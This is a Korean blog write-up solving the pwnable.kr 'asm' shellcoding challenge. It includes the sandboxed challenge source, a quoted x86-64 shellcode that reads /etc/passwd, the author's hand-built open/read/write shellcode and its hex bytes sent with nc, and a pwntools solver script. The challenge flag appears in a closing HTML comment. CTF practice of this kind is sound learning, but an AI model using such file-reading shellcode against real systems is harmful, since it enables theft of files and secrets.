---
title: "pwnable.kr - Toddler's bottle #17 asm"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #17 asm 문제 풀이

일단 접속해서 상황을 보면 이런 식이다

~~~
asm@pwnable:~$ ls
asm
asm.c
readme
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
asm@pwnable:~$ cat readme
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
asm@pwnable:~$
~~~

asm.c의 내용은 아래와 같다

```c
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

보면 결국 해야 하는 일은 /home/asm_pwn/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong 를 열어서 출력하는 shellcode를 만들어서 넣어주면 되는 일이다

소스코드에서 생소했던게 seccomp인데, 이는 secure computing mode의 약자라고 한다.
리눅스 커널에서 application sandboxing 메커니즘을 제공하는 보안기능이다.
sandbox()에서 하는 일은 seccomp를 이용해서 open, read, write, exit, exit_group외의 다른 system call을 차단시키는 일이다.

chroot에 대한 설명은 [stack overflow의 설명][stack_overflow_chroot]에 잘 나와 있어 이를 그대로 옮겨 온다

A chroot jail is a way to isolate a process and its children from the rest of the system. It should only be used for processes that don't run as root, as root users can break out of the jail very easily.

The idea is that you create a directory tree where you copy or link in all the system files needed for a process to run. You then use the chroot() system call to change the root directory to be at the base of this new tree and start the process running in that chroot'd environment. Since it can't actually reference paths outside the modified root, it can't perform operations (read/write etc.) maliciously on those locations.

On Linux, using a bind mounts is a great way to populate the chroot tree. Using that, you can pull in folders like /lib and /usr/lib while not pulling in /usr, for example. Just bind the directory trees you want to directories you create in the jail directory.

왠지 이런 비슷한 shellcode는 이미 많을것 같고, shellcode 짜는 건 엄청 귀찮을 것 같았으므로 대략 linux x64 read write shellcode 이런식으로 구글링 해서 이런 shellcode 를 찾았다

~~~
BITS 64
; Author Mr.Un1k0d3r - RingZer0 Team
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 82 bytes
global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x41
  
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdA"
~~~

금방 풀었구만, 하고 일단 시험용으로 path를 /home/asm/this_is... 로 바꾸고 돌려봤다.
참고로 저러한 asm 코드를 shellcode로 변환하려면 다음과 같은 과정을 거치면 된다
~~~
nasm -f elf64 shellcode.asm     # shellcode.o를 생성
objcopy -O binary -j .text shellcode.o shellcode_justbin  # shellcode.o에서 .text 부분만 떼어내기
od -An -t x1 shellcode_justbin  # hex form으로 출력
~~~

objdump를 이용하면 asm 한줄 한줄이 어떤 byte code로 바뀌었는지 자세하게 볼수도 있다.
~~~
nasm -f elf64 shellcode.asm
ld -o shellcoder shellcode.o
objdump -d shellcoder
~~~

근데... 안된다. 아무것도 출력되지 않았다.
이상해서 저 shellcode를 그대로 돌려봤다. 그랬더니 /etc/passwd는 잘 출력된다
내가 뭘 실수했나 싶어 /home/asm/asm.c도 출력해 봤다. 잘 출력된다.
근데 /home/asm/this_is... 는 안된다! /home/asm_pwn/this_is... 도 당연히 안된다.

파일 명이 긴것과 상관이 있나 싶어서 objdump로 보니까 xor byte [rdi + (path의 길이)], 0x41 여기에서 path의 길이가 127보다 커지면 null byte가 들어간다.
혹시 이것때문인가 싶어 rdi에 100씩 더하는 식으로 null byte생성도 피해봤다. 
근데 그래도 안된다. 같은 방법으로 /etc/passwd나 /home/as/asm.c를 해보면 그건 또 잘된다. 도저히 이해가 안되었다.

왜그런걸까, 하고 gdb를 붙여보려 했는데 그러면 gdb에서 disas는 되는데 breakpoint가 안걸린다. seccucomp인가 하는 녀석 때문인건가?

이런저런 삽질 끝에 그냥 path를 다른 방식으로 넘겨보기로 했다. stack에 push 한 다음 그걸 넘겨주면 그건 에러날 여지가 전혀 없지 않을까 싶어서였다.

~~~
xor rax, rax
push rax

mov rax, 0x676e6f306f306f30
push rax
mov rax, 0x6f306f306f306f30
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x3030306f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f303030303030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x3030306f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6c
push rax
mov rax, 0x5f797265765f7369
push rax
mov rax, 0x5f656d616e5f656c
push rax
mov rax, 0x69665f6568745f79
push rax
mov rax, 0x72726f732e656c69
push rax
mov rax, 0x665f736968745f64
push rax
mov rax, 0x6165725f65736165
push rax
mov rax, 0x6c705f656c69665f
push rax
mov rax, 0x67616c665f726b2e
push rax
mov rax, 0x656c62616e77705f
push rax
mov rax, 0x73695f736968742f
push rax
mov rax, 0x6e77705f6d73612f
push rax
mov rax, 0x656d6f682f2f2f2f
push rax

mov rdi, rsp
xor rsi, rsi
xor rax, rax
add al, 2
syscall

sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff
xor rax, rax
syscall

xor rdi, rdi
add dil, 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
  
xor rax, rax
add al, 60
syscall
~~~

이걸 컴파일 하는건 그냥 [Online x86 / x64 Assembler and Disassembler][online_assembler_link]를 이용했다. push할때 endianness 안지켜서 약간 삽질하다, 결국 flag를 얻을 수 있었다

~~~
asm@pwnable:~$ printf "\x48\x31\xC0\x50\x48\xB8\x30\x6F\x30\x6F\x30\x6F\x6E\x67\x50\x48\xB8\x30\x6F\x30\x6F\x30\x6F\x30\x6F\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x6F\x6F\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6C\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x69\x73\x5F\x76\x65\x72\x79\x5F\x50\x48\xB8\x6C\x65\x5F\x6E\x61\x6D\x65\x5F\x50\x48\xB8\x79\x5F\x74\x68\x65\x5F\x66\x69\x50\x48\xB8\x69\x6C\x65\x2E\x73\x6F\x72\x72\x50\x48\xB8\x64\x5F\x74\x68\x69\x73\x5F\x66\x50\x48\xB8\x65\x61\x73\x65\x5F\x72\x65\x61\x50\x48\xB8\x5F\x66\x69\x6C\x65\x5F\x70\x6C\x50\x48\xB8\x2E\x6B\x72\x5F\x66\x6C\x61\x67\x50\x48\xB8\x5F\x70\x77\x6E\x61\x62\x6C\x65\x50\x48\xB8\x2F\x74\x68\x69\x73\x5F\x69\x73\x50\x48\xB8\x2F\x61\x73\x6D\x5F\x70\x77\x6E\x50\x48\xB8\x2F\x2F\x2F\x2F\x68\x6F\x6D\x65\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xC0\x04\x02\x0F\x05\x66\x81\xEC\xFF\x0F\x48\x8D\x34\x24\x48\x89\xC7\x48\x31\xD2\x66\xBA\xFF\x0F\x48\x31\xC0\x0F\x05\x48\x31\xFF\x40\x80\xC7\x01\x48\x89\xC2\x48\x31\xC0\x04\x01\x0F\x05\x48\x31\xC0\x04\x3C\x0F\x05" | nc 0 9026
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: <tag output>
~~~

근데 왜 위에서 만든 shellcode가 안된건지는 지금도 잘 모르겠다. 근데 알아보기도 귀찮아...
뭔가 path가 길어지면서 position independent하지 않게 만드는 요소가 있었던건가? 안될 이유는 없어보이는데...
풀긴 풀었는데 조금 아쉽다.

다른 사람들은 어떻게 풀었나 싶어 인터넷 검색을 해봤는데 아주 신기한게 있었다

```python
from pwn import *
from socket import *

p = remote('pwnable.kr',9026)
context(arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp',0,0)
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)

p.recvuntil('shellcode:')
p.send(asm(shellcode))
log.success(p.recvline())
```

~~~
python asm.py
[+] Opening connection to pwnable.kr on port 9026: Done
[+] <tag output>
[*] Closed connection to pwnable.kr port 9026
~~~

이렇게 간단하게 풀리는게 있었다니....
보아하니 내가 만든 shellcode와 흡사한 행동을 하는 shellcode를 파이썬을 통해 만들수 있었던 모양이다!
pwntool이라는 것 같은데 이건 한번 공부해 둘 필요가 있을것 같다.

[pwnable.kr]: https://pwnable.kr
[stack_overflow_chroot]: https://unix.stackexchange.com/questions/105/chroot-jail-what-is-it-and-how-do-i-use-it
[online_assembler_link]: https://defuse.ca/online-x86-assembler.htm

<!-- Mak1ng_shelLcodE_i5_veRy_eaSy -->